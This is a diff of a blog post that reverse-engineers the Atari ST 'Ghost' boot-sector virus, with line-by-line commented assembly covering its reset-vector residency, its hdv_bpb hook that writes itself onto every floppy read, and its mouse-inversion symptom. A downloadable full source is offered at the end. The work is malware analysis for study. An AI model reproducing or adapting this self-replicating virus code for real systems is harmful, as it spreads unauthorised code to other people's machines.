@@ -4,12 +4,11 @@ Location: Stockholm / Sweden
 Category: Atari ST, Virus
 Lang: en
 Author: shazz
-status: published
 
 
 ## Introduction
 
-To start this journey in the world of Atari ST viruses, I decided to reverse engineered probably the most well known ST virus, it spreaded like cold in the winter, everybody had loppy infected. And I must admit, the first times I "caught" it, I did not even notice it was a virus, I thought it was an OS bug and I learnt to live with it! A little like the flu, the Ghost Virus was not lethal, maybe coded as a joke, we'll probably never know. Its symptoms where simple, after 10 replications, the vertical mouse direction was inverted. And "fixed" after 5 new replications, and so on. 
+To start this journey in the world of Atari ST viruses, I decided to reverse engineered probably the most well known ST virus, it spreaded like cold in the winter, everybody had loppy infected. And I must admit, the first times I "caught" it, I did not even notice it was a virus, I thought it was an OS bug and I learnt to live with it! A little like the flu, the Ghost Virus was not lethal, maybe coded as a joke, we'll probably never know. Its symptoms where simple, after 10 replications, the vertical mouse direction was inverted. And "fixed" after 5 new replications, and so on.
 So basically, it was like using your mouse like in typical flight simulators, go up... to go down.
 Yeah... like the flu, a little bothering but nothing that bad :)
 
@@ -21,7 +20,7 @@ Anyway, to summarize and before going into the details, here are the main charac
 
  - executable bootsector virus
  - memory resident using the official reset vector
- - memory resident using the undocumented technique
+ - stealh executation at boot using an undocumented technique
  - replaces the orignal HDV_BPB vector to be activated on any floppy (A or B) reads
  - copied itself on unused User Vectors RAM space
  - activate symptoms after 10 copies then switched OFF/ON every 5 copies
@@ -31,7 +30,7 @@ Anyway, to summarize and before going into the details, here are the main charac
 
 Finding the virus is straight forward, I'm sure I still have some infected disks and it was so wide-spread that some magazine disks or game compilations are still propragating it :) But, I was lazy, I simply extracted it from antivirus databases (which were not encrypted at all in most cases).
 
-Then I disassembling it using Eazy Rider on Hatari and checked with my preferred hex tools: ImHex which has a pretty good disassembler.
+Then I disassembling it using Eazy Rider on Hatari and checked with my preferred hex tools: [ImHex](https://imhex.werwolv.net/) which has a pretty good disassembler.
 I reformatted and commented the code, line by line, to be sure I understood all the magic.
 
 I also hacked a simple testing tool to be sure my "cleaned" version was still working as expected, so basically a TOS program to load the virus in memory, as the TOS boot loader is doing (if you're curious, check the [TOS disassembly code](https://github.com/th-otto/tos1x/blob/master/bios/startup.S)). I'll do another post later on this testing tool.
@@ -41,6 +40,9 @@ I also hacked a simple testing tool to be sure my "cleaned" version was still wo
 Let's start with some constants, they will be useful later on.
 
 ```asm
+; ----------------------------------------------------------------------------------------------------------
+; Constants
+; ----------------------------------------------------------------------------------------------------------
 PHYSTOP                 equ $42E
 RESVEC_ENA              equ $426
 RESVEC                  equ $42A
@@ -64,10 +66,13 @@ COUNTER_DEFAULT         equ $FFFFFFFB
 ; RAM locations
 BOOTSECT_BUF            equ $4C6
 RAM_ADDR                equ $140
-RESET_VECTOR_ADDR       equ $194
+
+; Relative addresses after copy to RAM_ADDR
+RESET_VECTOR_ADDR       equ RAM_ADDR + (RESET_VECTOR - LOADER)
 HDV_HPB_JMP_ADDR        equ RESET_VECTOR_ADDR + (HDV_HPB_ORIGINAL_VECTOR - RESET_VECTOR) + 2
 COUNTER_ADDR            equ RESET_VECTOR_ADDR + (COUNTER - RESET_VECTOR)
 INITMOUS_PARAMS_ADDR    equ RESET_VECTOR_ADDR + (INITMOUS_PARAMS - RESET_VECTOR)
+HDV_HPB_VECTOR_ADDR     equ RESET_VECTOR_ADDR + (HDV_HPB_VECTOR - RESET_VECTOR)
 RESET_VECTOR_PAGE       equ PAGE_SIZE*64
 RESET_VECTOR_SUBPAGE    equ PAGE_SIZE*1
 ```
@@ -76,84 +81,98 @@ What to note at this point, the virus is using some XBIOS functions, the reset v
 
 #### The Loader
 
-Then, the bootsector code starts with what I call the `Loader` part, dedicated to set the official reset vector to be "reset-proof" then copy itself in the ST memory at a "stealh" location, into the unused user vector space (ST only) from $140 to $380, so 576 bytes available, more than the bootsector itself. Please refer to this post to check the [ST memory map](http://127.0.0.1:8000/the-atari-stttfalcon-memory-map-en.html)
+Then, the bootsector code starts with what I call the `Loader` part, dedicated to set the official reset vector to be "reset-proof" then copy itself in the ST memory at a "stealh" location, into the unused user vectors space (ST only) from $140 to $380, so 576 bytes available, more than the bootsector itself. Please refer to this post to check the [ST memory map](/the-atari-stttfalcon-memory-map-en.html)
 
 
 Let's see the details:
 
 ```asm
+; ----------------------------------------------------------------------------------------------------------
+; Loader
+; ----------------------------------------------------------------------------------------------------------
 LOADER:
             MOVE.L    #$D6,D3 				            ; D3 = 214
             LEA       RAM_ADDR.W,A1 		            ; A1 @ 320 (0x140) => 1st USER DEFINED VECTOR
             LEA       LOADER(PC),A2			            ; A2 @ LOADER
-            MOVE.L    (A2),D2 				            ; STOP IF L001 IS IN 0x140 
-            CMP.L     (A1),D2 
-            BEQ       LOADER_END 
+            MOVE.L    (A2),D2 				            ; STOP IF L001 IS IN 0x140
+            CMP.L     (A1),D2
+            BEQ       LOADER_END
             MOVE.L    #RESVEC_MAGIC,D0 		            ; ELSE D0 = 0x31415926
             CLR.L     D1					            ; D1 - 0
-            CMP.L     RESVEC_ENA.W,D0 			        ; IF @ 0x426 != 0x31415926 => If this location contains the magic number $31415926 
+            CMP.L     RESVEC_ENA.W,D0 			        ; IF @ 0x426 != 0x31415926 = >If this location contains the magic number $31415926
                                                         ; then the system will jump through resvector (42A) on a system reset
             BNE       PASS_RESVEC 			            ; GOTO PASS_RESVEC
             MOVE.L    RESVEC.W,D1 				        ; ELSE D1 = 0x42A
 PASS_RESVEC:
-            LEA       RESET_VECTOR_FLAG(PC),A0          ; A0 = payload start address (RESET_VECTOR_FLAG)
-            MOVE.L    D1,(A0) 				            ; D1 = resvector address copied to empty space in RESET_VECTOR_FLAG
-            MOVE.L    #$194,D2				            ; set 0x194 (LOADER) in D2 to be the reset vector address
-            MOVE.L    D2,RESVEC.W 				        ; resvector: If the magic number in resvalid is set properly, this vector will be 
+            LEA       ORIGINAL_RESET_VECTOR(PC),A0      ; A0 = payload start address (ORIGINAL_RESET_VECTOR)
+            MOVE.L    D1,(A0) 				            ; D1 = resvector address copied to empty space in ORIGINAL_RESET_VECTOR
+            MOVE.L    #RESET_VECTOR_ADDR,D2				; set relocated RESET_VECTOR address in D2 to be the reset vector address
+            MOVE.L    D2,RESVEC.W 				        ; resvector: If the magic number in resvalid is set properly, this vector will be
                                                         ; jumped through on a system reset with the return address placed in A6.
             MOVE.L    D0,RESVEC_ENA.W 		            ; set magic value
 COPY_LOADER:
             MOVE.W    (A2)+,(A1)+ 			            ; FOR i = 214 TO 0 (214 words so 428 bytes)
             DBF       D3,COPY_LOADER		            ; COPY THIS PROGRAM A2+ (LOADER)+ to A1+ ($140)+
             MOVE.L    #COUNTER_DEFAULT,COUNTER_ADDR.W   ; reset counter to -10
-            BSR.S     INSTALL_HDV_HPB 
-LOADER_END: RTS 
+            BSR.S     INSTALL_HDV_HPB
+LOADER_END: RTS
 ```
 
 What to notice:
 
- 1. The loader checks if it is already copied at the target location (0x140), meaning the first byte is the same. If this is the case, it just do nothing more (`LOADER_END`)
+ 1. The loader checks if it is already copied at the target location (`0x140`), meaning the first byte is the same. If this is the case, it just do nothing more (`LOADER_END`)
  1. The Loader will also check the magic value, `0x31415926`, is set in the resvec register (`0x426`). If not, it will setup the reset vector:
     1. Set the reset vector routine address `RESET_VECTOR` (`0x194`) in `RESVEC` (`0x42A`)
-    1. Set the magic value `0x31415926` to `RESVEC_ENA` (`0x426`)  
-    1. Copy itself (428 bytes, more than needed) to `RAM_ADDR` (`0x140`). Not that this will relocate the RESET_VECTOR part at `0x194` as expected.
-    1. It will reset the replication counter `COUNTER_ADDR` to the default value: 0xFFFFFFFB which means -5 after owverflow
+    1. Set the magic value `0x31415926` to `RESVEC_ENA` (`0x426`)
+    1. Copy itself (428 bytes, more than needed) to `RAM_ADDR` (`0x140`). Not that this will relocate the `RESET_VECTOR` part at `0x194` as expected.
+    1. It will reset the replication counter `COUNTER_ADDR` to the default value: `0xFFFFFFFB` which means -5 after owverflow
     1. Finally it will branch to the `INSTALL_HDV_HPB` sub routine
 
-Note: for the first pass, when the bootsector is executed from his temporary location (`DSKBUFP`), the `RESET_VECTOR_FLAG`. If I'mm not wrong:
- - the `LOADER` copy in `0x140` is never banched and executed, it is used as storage to be copied on the bootsector
- - the `RESET_VECTOR_FLAG` value will be updated at the next boot, as the reset vector will be set, when the bootsector is executed again
+Note: for the first pass, when the bootsector is executed from his temporary location (at `DSKBUFP` address). If I'm not wrong:
+ - the `LOADER` copied in `0x140` is never banched and executed, it is used as storage to be copied on the bootsector at each replication or to reset the `HDV_HPB` vector at reset.
+ - if the `LOADER` is called again, it will check his presence at `Ox140` and exit if there.
+ - The `LOADER` copy is stored below the `0x800` mark and so will not be deleted after a warm reset.
 
 #### The HDV_NPB setup
 
 Last setup, the loader installs the routine overloading the `HDV_HPB` vector, used when `Getbpb()` is called by any aplication or the GEM.
+This routine is setup by the `LOADER` at first execution of the boot sector then recopied from the storage locaion to a stealh location in the upper RAM, then called after every warm reset.
 
 
 ```asm
+; ----------------------------------------------------------------------------------------------------------
+; Install HDV_HPB Vector Replacement
+; ----------------------------------------------------------------------------------------------------------
 INSTALL_HDV_HPB:
-            MOVE.L    #RESVEC_MAGIC,RESVEC_ENA.W        ; set magic value	
-            MOVE.L    HDV_BPB.W,D0 				        ; hdv_bpb: This vector is used when Getbpb() is called. 
-                                                        ; A value of 0 indicates that no hard disk is attached. 
+            ifne _DEBUG_
+            ADDQ.B    #1,4+DEBUG_ADDR.W
+            endc
+            MOVE.L    #RESVEC_MAGIC,RESVEC_ENA.W        ; set magic value
+            MOVE.L    HDV_BPB.W,D0 				        ; hdv_bpb: This vector is used when Getbpb() is called.
+                                                        ; A value of 0 indicates that no hard disk is attached.
                                                         ; Applications installing themselves here should expect
-                                                        ; parameters to be located on the stack as they would be for the actual function call beginning at 4(sp). 
+                                                        ; parameters to be located on the stack as they would be
+                                                        ; for the actual function call beginning at 4(sp).
                                                         ; If the installed process services the call it should RTS,
                                                         ; otherwise, leaving the stack intact, should JMP through the old vector value
             LEA       HDV_HPB_JMP_ADDR.W,A0             ; value of 0x2E0 JUMP address
             MOVE.L    D0,(A0)                           ; set original jum vector return to JMP
-            LEA       HDV_HPB_VECTOR.W,A0               ;
+            LEA       HDV_HPB_VECTOR_ADDR.W,A0          ;
             MOVE.L    A0,HDV_BPB.W                      ; set vector to 0x20E (HDV_HPB_VECTOR)
-            RTS 
+
+            RTS
 ```
 
-In detals, it:
+In detals:
 
- 1. sets the magic value `RESVEC_MAGIC`in `RESVEC_ENA` (`0x426`) to enable the reset vector
- 1. gets the default hdv_bpb vector address and stores it in `HDV_HPB_JMP_ADDR`
- 1. replace the hdv_bpb vector address by `HDV_HPB_VECTOR`
+ 1. It sets the magic value `RESVEC_MAGIC`in `RESVEC_ENA` (`0x426`) to enable the reset vector
+ 1. It gets the default `hdv_bpb` vector address and stores it in `HDV_HPB_JMP_ADDR`
+ 1. It replaces the `hdv_bpb` vector address by `HDV_HPB_VECTOR`
+
 
 #### The new hdv_bpb vector
 
-As set in `HDV_BPB` here is the new hdv_bpb vector which is the heart of the virus. As mentionned before it is excecuted each time the BIOS function Getbpb(). In short:
+As set in `HDV_BPB` here is the new hdv_bpb vector which is the heart of the virus. As mentionned before it is excecuted each time the BIOS function `Getbpb()`. In short:
 
 ```
 BPB *Getbpb( dev )
@@ -163,7 +182,7 @@ Getbpb() returns the address of the current BPB (Bios Parameter Block) for a mou
 - OPCODE: 7 (0x07)
 - AVAILABILITY: All TOS versions.
 - PARAMETERS: dev specifies the mounted device (‘A:’ = 0, ‘B:’ = 1) .
-- BINDING 
+- BINDING
     move.w dev,-(sp)
     move.w #$07,-(sp)
     trap #13
@@ -185,14 +204,17 @@ Getbpb() returns the address of the current BPB (Bios Parameter Block) for a mou
 ```
 
 So each time an application or the GEM needs to read the disk information, this function is called... and so the virus routine.
-The code is detailled but in brief, here is what happens, the routine reads and buffers the bootsector, copy the `Loader` on top of it, patchs it to make it executable and writes it back.
+The code is detailled but in brief, here is what happens, the routine reads and buffers the bootsector, copy the `LOADER` on top of it, patchs it to make it executable and writes it back.
 
 Each time it happens, a counter is incremented. And if the counter reaches 5 (starting from -5 the first time), the routine will retrieve the `mousevec` vector and then usse it to call the `initmouse` XBIOS function which has an option to inverse the mouse vertical axis.
 
 ```asm
+; ----------------------------------------------------------------------------------------------------------
+; HDV_HPB Vector Replacement - Core virus code
+; ----------------------------------------------------------------------------------------------------------
 HDV_HPB_VECTOR:
             MOVE.W    4(sp),D0                          ; hdv_bpb vector
-            CMP.W     #2,D0                             ; if dev is nto A or B (>=2), do to original vector
+            CMP.W     #2,D0                             ; if dev is not A or B (>=2), do to original vector
             BGE       HDV_HPB_ORIGINAL_VECTOR           ; else
             MOVEM.L   A0-sp/D7/D1-D5,-(sp)              ; duplicate bootloader
             MOVE.W    D0,D7                             ; D7 contains A or B (0 or 1)
@@ -200,29 +222,29 @@ HDV_HPB_VECTOR:
             MOVE.L    #(1 << 16 | 0),-(sp)              ; track: 0 | sector: 1
             MOVE.W    D7,-(sp)                          ; dev, D7 contains A or B (0 or 1)
             CLR.L     -(sp)                             ; rsrvd => 0
-            LEA       BOOTSECT_BUF.W,A5           
-            MOVEA.L   (A5),A5                           ;  
-            MOVEA.L   A5,A6                             ; 
+            LEA       BOOTSECT_BUF.W,A5
+            MOVEA.L   (A5),A5                           ;
+            MOVEA.L   A5,A6                             ;
             MOVE.L    A5,-(sp)                          ; buf = (BOOTSECT_BUF)
-            MOVE.W    #FLOPRD,-(sp) 	                ; FLOPRD 
-            TRAP      #XBIOS 
+            MOVE.W    #FLOPRD,-(sp) 	                ; FLOPRD
+            TRAP      #XBIOS
             ADDA.L    #$14,sp                           ; fix stack
-            TST.W     D0                                ; 0 = success      
-            BMI       HDV_HPB_VECTOR_END                ; else quit 
+            TST.W     D0                                ; 0 = success
+            BMI       HDV_HPB_VECTOR_END                ; else quit
 PATCH_BOOT:
             MOVE.W    #$601C,(A5)                       ; patch read bootloader buffer with BRA
             ADDA.L    #$1E,A5                           ; advance buffer to bootloader start ($1E)
             LEA       LOADER(PC),A4                     ; A4 = start bootsector program
             LEA       PROG_END(PC),A3                   ; A3 = end
-COPY_LOADER_2:      
+COPY_LOADER_2:
             MOVE.W    (A4)+,(A5)+                       ; copy virus prg
-            CMPA.L    A3,A4 
-            BLT.S     COPY_LOADER_2 
-            MOVEA.L   A6,A5 
+            CMPA.L    A3,A4
+            BLT.S     COPY_LOADER_2
+            MOVEA.L   A6,A5
             MOVE.W    #$FE,D1                           ; D1 = 254 bytes
-            MOVE.W    #BOOT_CHK,D0                      ; CHK bootsector value 
-CALC_BOOT_CHK:      
-            SUB.W     (A5)+,D0                        
+            MOVE.W    #BOOT_CHK,D0                      ; CHK bootsector value
+CALC_BOOT_CHK:
+            SUB.W     (A5)+,D0
             DBF       D1,CALC_BOOT_CHK
             MOVE.W    D0,(A5)                           ; add remainder to make bootsector executable
 
@@ -231,17 +253,19 @@ CALC_BOOT_CHK:
             MOVE.W    D7,-(sp)                          ; dev, D7 contains A or B (0 or 1)
             CLR.L     -(sp)                             ; rsrvd = 0
             MOVE.L    A6,-(sp)                          ; buf = (BOOTSECT_BUF)
-            MOVE.W    #FLOPWR,-(sp) 	                ; FLOPWR 
-            TRAP      #XBIOS                             
+            MOVE.W    #FLOPWR,-(sp) 	                ; FLOPWR
+            TRAP      #XBIOS
             ADDA.L    #$14,sp                           ; fix stack
             TST.W     D0                                ; success if 0
             BMI       HDV_HPB_VECTOR_END                ; else quit
             ADDI.L    #1,COUNTER_ADDR.W                 ; add replication counter of 1
-            CMPI.L    #5,COUNTER_ADDR.W                 ; if not 5 quit (starting fron 251, meaning 10 iterations then reset to 0 so 5 to 5)
-            BNE       HDV_HPB_VECTOR_END         
+            CMPI.L    #5,COUNTER_ADDR.W                 ; if not 5 quit (starting fron 251, meaning 10 iterations
+                                                        ; then reset to 0 so 5 to 5)
+            BNE       HDV_HPB_VECTOR_END
             CLR.L     COUNTER_ADDR.W                    ; else set mousevec
-            MOVE.W    #KBDVBASE,-(sp) 	                ; Kbdvbase() returns a pointer to a system structure containing a ‘jump’ table to system vector handlers.
-            TRAP      #XBIOS 
+            MOVE.W    #KBDVBASE,-(sp) 	                ; Kbdvbase() returns a pointer to a system structure containing
+                                                        ; a ‘jump’ table to system vector handlers.
+            TRAP      #XBIOS
             ADDQ.L    #2,sp                             ; fix stack, midivec, vkbderr, vmiderr , statvec, mousevec, clockvec, joyvec pointers struct in set in D0
             ADD.L     #MOUSEVEC_OFFSET,D0               ; D0+16 => mousevec
             EXG       A0,D0                             ; A0 = mousevec address
@@ -257,50 +281,73 @@ CALC_BOOT_CHK:
             ADDA.L    #$C,sp     ;12                    ; fix stack
 
             EORI.B    #1,INITMOUS_PARAMS_ADDR.W         ; Invert INITMOUS_PARAMS_ADDR[0] = y origin to 1 to let people think this is done :D
-HDV_HPB_VECTOR_END:   MOVEM.L   (sp)+,A0-A6/D1-D7 
+HDV_HPB_VECTOR_END:   MOVEM.L   (sp)+,A0-A6/D1-D7
 
 HDV_HPB_ORIGINAL_VECTOR:
             JMP       $00FC0FCA                         ; will be patched to contain hdv_bpb original vector address
 
 INITMOUS_PARAMS:
-            DC.B      $01                               ; y origin at top 
+            DC.B      $01                               ; y origin at top
             DC.B      $01                               ; buttons events
             DC.B      $01                               ; x threshold
             DC.B      $01                               ; y threshold
-      
-COUNTER: 
-            DC.L      $FFFFFFFB                         ; replication counter, initialized at -5
+
+COUNTER:
+            DC.L      COUNTER_DEFAULT                   ; replication counter, initialized at -5
 
 END:        DC.B      $00,$00
+
+PROG_END:DCB.W        24,0
+            DC.B      'J',$97
+
+    END
+
 ```
 
 In details, this routine:
 
- 1. Retrieves the 1st Getbpb() parameter from the stack: dev (0 for A, 1 for B, ...)
- 1. If A or B (meaning this is a floppy), reads the bootsector using XBIOS FLOPRD and stores it in a buffer (`BOOTSECT_BUF`)
- 1. Patches the buffer adding the classic `0x601C` BRA instruction to branch to the bootsector code
- 1. Copies the `Loader` into the buffer at `0x1E`
- 1. Compute the checksum andset the lasst word to be equals to `0x1234` rquired to make the bootsector executable
- 1. Write back the buffer to the bootsector using XBIOS FLOPWR
- 1. Increment the counter `COUNTER_ADDR` (initilialized at -5) 
+ 1. Retrieves the 1st `Getbpb()` parameter from the stack: dev (0 for A, 1 for B, ...)
+ 1. If A or B (meaning this is a floppy), reads the bootsector using XBIOS `FLOPRD` and stores it in a buffer (`BOOTSECT_BUF`), which is also where the TOS copies bootsector when read.
+ 1. Patches the buffer adding the classic `0x601C` BRA instruction to branch to the bootsector code.
+ 1. Copies the `LOADER` into the buffer at `0x1E` location.
+ 1. Compute the checksum andset the lasst word to be equals to `0x1234` rquired to make the bootsector executable.
+ 1. Write back the buffer to the bootsector using XBIOS `FLOPWR`.
+ 1. Increment the counter `COUNTER_ADDR` (initilialized at -5).
  1. If `COUNTER_ADDR` equals to 5:
-    1. use XBIOS KBDVBASE call to retrieve keyboard, midi... ans especiall the mousevec vector (located at `MOUSEVEC_OFFSET` in the returned structure)
-    1. Call XBIOS initmouse(mode, params, mouse vector) while setting the first param, y origin at top, to 1 to invert the Y axis
+    1. use XBIOS `KBDVBASE` call to retrieve keyboard, midi... and especially the mousevec vector (located at `MOUSEVEC_OFFSET` in the returned structure)
+    1. Call XBIOS `initmouse(mode, params, mouse vector)` while setting the first param, y origin at top, to 1 to invert the Y axis
     1. Patch the params data with a XOR to reset the y origin to 0 and remove the virus effect... for 5 copies!
 
 #### The Reset Vector
 
-The Reset Vector, installed by the Loader, will use an undocumented TOS feature which allow a routine to be run after reset if a magic value is set at some predefined locations and if the routine checksu is equals to `0x5678` (you'll notice the symetry with the bootsector checksum: `0x1234`).
+The Reset Vector, installed by the `LOADER`, will use an undocumented TOS feature which allow a routine to be run after reset, before the RAM is flushed, if a magic value is set at some predefined locations and if the routine checksu is equals to `0x5678` (you'll notice the symetry with the bootsector checksum: `0x1234`).
 
 ```asm
+; ----------------------------------------------------------------------------------------------------------
+; Reset vector flag and routine
+; ----------------------------------------------------------------------------------------------------------
+ORIGINAL_RESET_VECTOR:
+            DCB.W     2,0 					            ; $190: resvector address will be written here
+
+; Concerning cold and warm reset. For every virus coder it is very important to know what's going on at reset
+; sequence  esspecially concerning memory locations and system; vectors.
+; In generally: in both reset cases memory is zeroed from (phystop - $200) to $800.
+; Just before that, TOS searches memory in steps of two memory pages (512 bytes) in "hope" to find a
+; following contents: longword $12123456 and a longword of actual double memory page.
+; Note, as said, that if this code is the zeroed range, it will be exectuted THEN erased.
+
 RESET_VECTOR:                                           ; $194
             MOVEA.L   PHYSTOP.W,A1 				        ; Set A1 to phystop (end of mem), $80000/524288 on 520ST
                                                         ; ghost looks to install itself at a required $200 boundary page
                                                         ; at page 40 ($8000) - 1 ($200)
-            SUBA.L    #RESET_VECTOR_PAGE,A1             ; 
+            SUBA.L    #RESET_VECTOR_PAGE,A1
             SUBA.L    #RESET_VECTOR_SUBPAGE,A1          ; decrease a memory page (512 bytes)
 
             MOVE.L    A1,D1                             ; Save location address (needed to TOS)
+            ifne _DEBUG_
+            MOVE.L    D1,DEBUG_ADDR.W
+            endc
+
             MOVE.L    #RESIDENT_MAGIC,(A1)+             ; Add magic word 0x12123456 that TOS looks for
             MOVE.L    D1,(A1)+                          ; then actual memory address of the magic work
 
@@ -314,7 +361,7 @@ RESET_VECTOR:                                           ; $194
 COPY_INSTALL_HDV_HPB:
             MOVE.W    (A3)+,(A1)+                       ; copy INSTALL_HDV_HPB vector routine after magic word / address
             CMPA.L    A4,A3                             ; until copy routine address in reached
-            BLT.S     COPY_INSTALL_HDV_HPB                           
+            BLT.S     COPY_INSTALL_HDV_HPB
 
             LEA       LOADER(PC),A3                     ; A3 = bootloader start
             MOVE.L    A3,(A1)+                          ; then set it at the end (why? after RTS?)
@@ -324,28 +371,26 @@ COPY_INSTALL_HDV_HPB:
             MOVE.W    #$FE,D2                           ; D2 = 254 words (2 pages)
 CALC_RESIDENT_CHK:
             ADD.W     (A3)+,D0                          ; Compute checksum
-            DBF       D2,CALC_RESIDENT_CHK              ; 
+            DBF       D2,CALC_RESIDENT_CHK              ;
             MOVE.W    #RESIDENT_CHK,D2                  ; then substract $5678 to adjust the checksum
             SUB.W     D0,D2                             ;
             MOVE.W    D2,(A3)                           ; copy this value to the end of the virus
 
             MOVE.L    #0,RESVEC_ENA.W                   ; remove magic value to resvector
-            MOVEA.L   RESET_VECTOR_FLAG(PC),A1          ; set payload start in a1
-            CMPA.L    #0,A1                             ; check paylaod start is empty
-            BNE       RESET_VECTOR_SET                  ; if not jump to payload
+            MOVEA.L   ORIGINAL_RESET_VECTOR(PC),A1      ; get reset vector address in a1
+            CMPA.L    #0,A1                             ; check reset vector address is empty
+            BNE       RESET_VECTOR_SET                  ; if not jump to reset vector address
             JMP       (A6)                              ; else jump to original resetvec return address
-RESET_VECTOR_SET:  
+RESET_VECTOR_SET:
             JMP       (A1)
 ```
 
 So in order, the reset vector routine:
 
- 1. Set a specific target address: end of ST RAM (`PHYSTOP` (`0x42E`) depends on model 520, 1040..., for example that's 0x80000 on a 520, 0x100000 on a 1040), then minus 0x8000 and minus 0x200 (basically 32KB + 512 bytes before the end of the available memory)
-    1. It has to be on a 0x200 (512) bytes boundary
+ 1. Set a specific target address: end of ST RAM (`PHYSTOP` (`0x42E`) depends on model 520, 1040..., for example that's `0x80000` on a 520, `0x100000` on a 1040), then minus `0x8000` and minus `0x200` (basically 32KB + 512 bytes before the end of the available memory)
+    1. It has to be on a `0x200` (512) bytes boundary
     1. It is better to be near the end of the memory to limit chances to be overlapped and erased after reset
-    1. You'll notice the memory substraction in done in 2 steps and not a "simple" SUBA.L #$8200,A1.
-    
-Why? It looks to be linked to 68K SUBA opcode which considered the offset as signed as $8000 is half a word. I need to investigate what the assember generates for the size specification:
+    1. You'll notice the memory substraction in done in 2 steps and not a "simple" `SUBA.L #$8200,A1`. Why? It looks to be linked to 68K SUBA opcode which considered the offset as signed as $8000 is half a word. I need to investigate what the assember generates for the size specification:
 
 ```
 Object Code:  1001 ddds 11 ff ffff
@@ -357,14 +402,30 @@ Object Code:  1001 ddds 11 ff ffff
                 ffffff is the effective address field
 ```
 
- 1. Then, as not documented :), at this special location the magic number `RESIDENT_MAGIC` (`0x12123456`) as long should be written
+ 1. Then, as not documented :) at this special location the magic number `RESIDENT_MAGIC` (`0x12123456`) as long should be written
  1. And in the next long, the value of this specific location, so in this case `PHYSTOP` - `0x8200`
  1. After this kind of "header", the reset vector copy the `INSTALL_HDV_HPB` routine, the "replicator", word by word.
  1. I also copied, at the end, the `INSTALL_HDV_HPB` address but I don't know why (yet?)
  1. Finally it has to compute the checksum of this resident routine, starting from the location address in the header up to 2 pages (255 words - last word) and fix it to be equals to `RESIDENT_CHK` (`0x5678`) and stores it in the last word.
  1. It disables the reset vector as the resident routine is installed
- 1. Jump to the `RESET_VECTOR_FLAG` address if set, which should contains the resvector address, else the original vector address
+ 1. Jump to the `ORIGINAL_RESET_VECTOR` address if set, which should contains the resvector address, else the original vector address
 
+What is important to understand, and took me some time and debug:
+ - After a warm reset, the official reset vector copies the `INSTALL_HDV_HPB` at the stealh location amd set the magic header
+ - This is only task of the eset vector then it deactivates until `INSTALL_HDV_HPB` sets it again.
+ - Then the TOS looks along the RAM to check if this magic header exists at `0x200` boundaries and if found execute the routine
+ - The `INSTALL_HDV_HPB` is then executed to be sure the `hdv_bpb` vector responsible to replicate the virus is set
+ - The TOS then flushes the memory (from $800 to near `PHYSTOP`), leaving the `LOADER` intact but deleting the `INSTALL_HDV_HPB` copied routine
 
+## Timeline
 
+I drawed a kind of timeline, trying to show the various steps and where the relocatable virus code is copied and executed.
 
+<!-- ![timeline]({attach}images/ghost_timeline.png "Ghost virus timeline") -->
+<a href="{attach}images/ghost_timeline.png" target="_blank"><img src="{attach}images/ghost_timeline.png" width="400"></a>
+
+## Conclusion
+
+I start to think this is why this virus was called the **Ghost Virus**, and not the mouse inversion virus (or any name linked to the symptoms), as the magic is really in this transient routine automatically called then deleted, leaving no trace of its execution but making sure the replication vector (`hdv_bpb`) is still alive.
+
+You can download the full commented (and tested identical to the original virus after assembling with `vasm`) here: [GHOST.S]({attach}sources/GHOST.S)
